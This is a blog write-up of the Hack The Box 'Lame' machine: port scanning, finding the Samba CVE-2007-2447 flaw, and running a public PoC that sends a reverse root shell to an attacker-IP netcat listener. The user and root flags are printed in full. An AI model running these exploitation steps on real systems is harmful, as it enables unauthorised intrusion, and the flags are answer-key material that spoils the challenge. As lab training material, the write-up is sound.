<!doctype html> <head> <meta charset=utf-8> <meta name=viewport content="width=device-width,initial-scale=1"> <meta name=theme-color content=#333333> <base href=/logbook/ > <link href=global.css rel=stylesheet> <link href=fonts.css rel=stylesheet> <link href=highlight.css rel=stylesheet> <link href=manifest.json rel=manifest> <link href=as-logo2.ico rel=icon type=image/png> <link href=client/main.3417729283.css rel=stylesheet> <noscript id=sapper-head-start></noscript><title>HTB - Lame</title><meta content=article property=og:type><meta content="HTB - Lame" property=og:title><meta name=Description content=""><meta content="" property=og:description><meta name=twitter:card content=summary_large_image><meta name=twitter:title value="HTB - Lame"><meta name=twitter:description content=""><meta name=twitter:label1 value="Published on"><meta name=twitter:data1 value="Apr 23, 2021"><meta name=twitter:label2 value="Reading Time"><meta name=twitter:data2 value="3 min read"><noscript id=sapper-head-end></noscript> </head> <body> <div id=sapper> <div class="svelte-v25qrq layout"> <header class=svelte-y9ah38> <a href=/ > <img alt=Sapper src=as-logo2.ico class=svelte-1u41owj> </a> <nav class=svelte-16qpxtx> <a href=. class=svelte-16qpxtx>Home</a> <a href=blog rel=prefetch class="svelte-16qpxtx selected">Blog</a> <a href=https://anu-bhav.github.io class=svelte-16qpxtx>Website</a> </nav> </header> <main class=svelte-v25qrq> <header class=svelte-ww3xvk> <p class=svelte-ww3xvk>April 23, 2021 ~ 3 min read</p> <h1 class=svelte-ww3xvk>HTB - Lame</h1> <a href=pdf/Lame.pdf target=_blank rel=nofollow class=svelte-ww3xvk id=pdf_link>View As PDF</a> <hr class=svelte-ww3xvk> </header> <div class=container> <article class=content> <h1 id=lame---1010103>Lame - 10.10.10.3</h1> <h2 id=enumeration>Enumeration</h2> <h3 id=nmap>Nmap</h3> <p>command: </p> <pre class=language-bash><code class=language-bash>nmap -p- -Pn 10.10.10.3 -oA nmap/quick</code></pre><pre class=language-bash><code class=language-bash>Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 04:56 EDT
Verbosity Increased to 1.
Connect Scan Timing: About 64.81% done; ETC: 05:04 (0:02:45 remaining)
Discovered open port 3632/tcp on 10.10.10.3
Verbosity Decreased to 0.
Nmap scan report for 10.10.10.3
Host is up (0.24s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 447.44 seconds</code></pre><h2 id=vulnerability-information>Vulnerability Information</h2> <p>Searchsploit is used to search for a known exploit the samba version <strong>3.0.20</strong></p> <p>command: </p> <pre class=language-bash><code class=language-bash>searchsploit samba 3.0.20</code></pre><p><img alt="" src=Lame.assets/image-20210423035311257.png></p> <p><img alt="" src=Lame.assets/image-20210423030333503.png></p> <p>After researching the exploit <strong>Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution</strong> , its CVE can be found on exploitdb website. </p> <p><a href=https://www.exploit-db.com/exploits/16320 target=_blank rel=nofollow>Link</a>: <a href=https://www.exploit-db.com/exploits/16320 target=_blank rel=nofollow>https://www.exploit-db.com/exploits/16320</a> CVE: 2007-2447</p> <p><img alt="" src=Lame.assets/image-20210423040537738.png></p> <p>Upon searching for the CVE in <a href=https://nvd.nist.gov/ target=_blank rel=nofollow>National Vulnerability Database</a>, it can be known on how does the payload work. </p> <p><a href=https://nvd.nist.gov/vuln/detail/CVE-2007-2447 target=_blank rel=nofollow>Link</a>: <a href=https://nvd.nist.gov/vuln/detail/CVE-2007-2447 target=_blank rel=nofollow>https://nvd.nist.gov/vuln/detail/CVE-2007-2447</a></p> <p><img alt="" src=Lame.assets/image-20210423041046805.png></p> <p><strong>Vulnerability Explanation:</strong></p> <p>The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.</p> <h2 id=exploitation>Exploitation</h2> <p>When searching for <strong>cve-2007-2447 exploit</strong> on google, a github repository is found containing a python POC script.</p> <p><img alt="" src=Lame.assets/image-20210423050552798.png> </p> <p><a href=https://nvd.nist.gov/vuln/detail/CVE-2007-2447 target=_blank rel=nofollow>Link</a>: <a href=https://github.com/amriunix/CVE-2007-2447 target=_blank rel=nofollow>https://github.com/amriunix/CVE-2007-2447</a></p> <p><img alt="" src=Lame.assets/image-20210423050643210.png></p> <p>A python package needs to be installed to run the script.</p> <p>command:</p> <pre class=language-bash><code class=language-bash>mkdir exploit
cd exploit
git clone https://github.com/amriunix/CVE-2007-2447
pip install --user pysmb</code></pre><p><img alt="" src=Lame.assets/image-20210423050855031.png></p> <p>After installing the exploit dependencies, the python exploit can now be ran.</p> <p>command:</p> <pre class=language-bash><code class=language-bash>python3 usermap_script.py 10.10.10.3 139 10.10.14.3 8888
rlwrap nc -lvnp 8888</code></pre><p>On the first pane, the exploit is being executed, and on the second one, a connection is received coming from the target.</p> <p><img alt="" src=Lame.assets/image-20210423055920733.png></p> <p>After exploiting, the shell is already running as root.</p> <h3 id=usertxt>User.txt</h3> <pre class=language-bash><code class=language-bash>find /home -type f</code></pre><p><img alt="" src=Lame.assets/image-20210423060412613.png></p> <p>the <strong>user.txt</strong> file is located in user <strong>makis</strong> home folder.</p> <pre class=language-bash><code class=language-bash>cat /home/makis/user.txt</code></pre><p><img alt="" src=Lame.assets/image-20210423060516976.png></p> <blockquote> <p>user.txt flag: <code>43bf1c6bb6f868ad4e55452e7db7eeb1</code></p> </blockquote> <h3 id=roottxt>Root.txt</h3> <p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p> <pre class=language-bash><code class=language-bash>cat /root/root.txt</code></pre><p><img alt="" src=Lame.assets/image-20210423060921071.png></p> <blockquote> <p>root.txt flag: <code>a8221b5e4e0a0535e87eae265190c232</code></p> </blockquote> </article> <hr> <button class="back-to-top hidden svelte-h76b9j"> <svg aria-hidden=true class="" id="" role=img style=height:1em;line-height:.75em;font-size:1.33333em;vertical-align:-.225em;overflow:visible viewBox="0 0 448 512" xmlns=http://www.w3.org/2000/svg> <g transform="translate(256 256)"> <g transform=""> <path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z" fill=currentColor transform="translate(-256 -256)"></path> </g> </g> </svg> </button> <div class=svelte-16tlu6p> <img alt="Anubhavsingh Sawdagur" src=profile-pic.png class=svelte-16tlu6p> <p class=svelte-16tlu6p> Hi, I'm <strong class=highlight>Anubhav</strong>. I'm an Ethical Hacker, Software Engineer and Network Engineer from Mauritius. <br> You can find me on <a href=https://www.instagram.com/_anu_bhav_/ target=_blank>Instagram</a>, <a href=https://www.twitter.com/0_Pr0t0typ3/ target=_blank>Twitter</a>, <a href=https://www.facebook.com/anubhav.s.0809/ target=_blank>Facebook</a> or <a href=https://www.linkedin.com/in/anubhavsingh-sawdagur/ target=_blank>LinkedIn</a>. See more of my work on <a href="https://github.com/Anu-bhav?tab=repositories" target=_blank>GitHub</a> or read about me on my <a href=https://anu-bhav.github.io/ target=_blank>Website</a> </p> </div> </div> </main> <footer class=svelte-v25qrq> <span> Â© 2021 Personal Blog. Powered by <a href=https://sapper.svelte.dev target=_blank>Sapper</a>. Template by <a href=https://anu-bhav.github.io target=_blank>Anubhavsingh Sawdagur</a>. </span> </footer> </div></div> <script>__SAPPER__={baseUrl:"/logbook",preloaded:[void 0,null,{pdf_location:"pdf\u002FLame.pdf",has_pdf:true,post:{title:"HTB - Lame",slug:"Lame",html:"\u003Ch1 id=\"lame---1010103\"\u003ELame - 10.10.10.3\u003C\u002Fh1\u003E\n\u003Ch2 id=\"enumeration\"\u003EEnumeration\u003C\u002Fh2\u003E\n\u003Ch3 id=\"nmap\"\u003ENmap\u003C\u002Fh3\u003E\n\u003Cp\u003Ecommand: \u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Enmap -p- -Pn 10.10.10.3 -oA nmap\u002Fquick\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003EHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https:\u002F\u002Fnmap.org ) at 2021-04-23 04:56 EDT\nVerbosity Increased to 1.\nConnect Scan Timing: About 64.81% done; ETC: 05:04 (0:02:45 remaining)\nDiscovered open port 3632\u002Ftcp on 10.10.10.3\nVerbosity Decreased to 0.\nNmap scan report for 10.10.10.3\nHost is up (0.24s latency).\nNot shown: 65530 filtered ports\nPORT     STATE SERVICE\n21\u002Ftcp   open  ftp\n22\u002Ftcp   open  ssh\n139\u002Ftcp  open  netbios-ssn\n445\u002Ftcp  open  microsoft-ds\n3632\u002Ftcp open  distccd\n\nNmap done: 1 IP address (1 host up) scanned in 447.44 seconds\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch2 id=\"vulnerability-information\"\u003EVulnerability Information\u003C\u002Fh2\u003E\n\u003Cp\u003ESearchsploit is used to search for a known exploit the samba version \u003Cstrong\u003E3.0.20\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003Ecommand: \u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Esearchsploit samba 3.0.20\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423035311257.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423030333503.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EAfter researching the exploit \u003Cstrong\u003ESamba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution\u003C\u002Fstrong\u003E , its CVE can be found on exploitdb website. \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fwww.exploit-db.com\u002Fexploits\u002F16320\"\u003ELink\u003C\u002Fa\u003E:  \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fwww.exploit-db.com\u002Fexploits\u002F16320\"\u003Ehttps:\u002F\u002Fwww.exploit-db.com\u002Fexploits\u002F16320\u003C\u002Fa\u003E CVE: 2007-2447\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423040537738.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EUpon searching for the CVE in \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fnvd.nist.gov\u002F\"\u003ENational Vulnerability Database\u003C\u002Fa\u003E, it can be known on how does the payload work. \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2007-2447\"\u003ELink\u003C\u002Fa\u003E: \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2007-2447\"\u003Ehttps:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2007-2447\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423041046805.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003EVulnerability Explanation:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the &quot;username map  script&quot; smb.conf option is enabled, and allows remote authenticated  users to execute commands via shell metacharacters involving other  MS-RPC functions in the (2) remote printer and (3) file share  management.\u003C\u002Fp\u003E\n\u003Ch2 id=\"exploitation\"\u003EExploitation\u003C\u002Fh2\u003E\n\u003Cp\u003EWhen searching for \u003Cstrong\u003Ecve-2007-2447 exploit\u003C\u002Fstrong\u003E on google, a github repository is found containing a python POC script.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423050552798.png\" alt=\"\"\u003E \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2007-2447\"\u003ELink\u003C\u002Fa\u003E: \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fgithub.com\u002Famriunix\u002FCVE-2007-2447\"\u003Ehttps:\u002F\u002Fgithub.com\u002Famriunix\u002FCVE-2007-2447\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423050643210.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EA python package needs to be installed to run the script.\u003C\u002Fp\u003E\n\u003Cp\u003Ecommand:\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Emkdir exploit\ncd exploit\ngit clone https:\u002F\u002Fgithub.com\u002Famriunix\u002FCVE-2007-2447\npip install --user pysmb\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423050855031.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EAfter installing the exploit dependencies, the python exploit can now be ran.\u003C\u002Fp\u003E\n\u003Cp\u003Ecommand:\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Epython3 usermap_script.py 10.10.10.3 139 10.10.14.3 8888\nrlwrap nc -lvnp 8888\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EOn the first pane, the exploit is being executed, and on the second one, a connection is received coming from the target.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423055920733.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EAfter exploiting, the shell is already running as root.\u003C\u002Fp\u003E\n\u003Ch3 id=\"usertxt\"\u003EUser.txt\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Efind \u002Fhome -type f\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423060412613.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003Ethe \u003Cstrong\u003Euser.txt\u003C\u002Fstrong\u003E file is located in user \u003Cstrong\u003Emakis\u003C\u002Fstrong\u003E home folder.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecat \u002Fhome\u002Fmakis\u002Fuser.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423060516976.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003Euser.txt flag: \u003Ccode\u003E43bf1c6bb6f868ad4e55452e7db7eeb1\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n\u003Ch3 id=\"roottxt\"\u003ERoot.txt\u003C\u002Fh3\u003E\n\u003Cp\u003Ethe \u003Cstrong\u003Eroot.txt\u003C\u002Fstrong\u003E file is always located in \u003Cstrong\u003E\u002Froot\u002F\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecat \u002Froot\u002Froot.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Lame.assets\u002Fimage-20210423060921071.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003Eroot.txt flag: \u003Ccode\u003Ea8221b5e4e0a0535e87eae265190c232\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n",date:"2021-04-23",excerpt:"",printDate:"April 23, 2021",printReadingTime:"3 min read"}}]};if('serviceWorker' in navigator)navigator.serviceWorker.register('/logbook/service-worker.js');(function(){try{eval("async function x(){}");var main="/logbook/client/client.e7e93abc.js"}catch(e){main="/logbook/client/legacy/client.60304074.js"};var s=document.createElement("script");try{new Function("if(0)import('')")();s.src=main;s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="/logbook/client/shimport@1.0.1.js";s.setAttribute("data-main",main);}document.head.appendChild(s);}());</script> 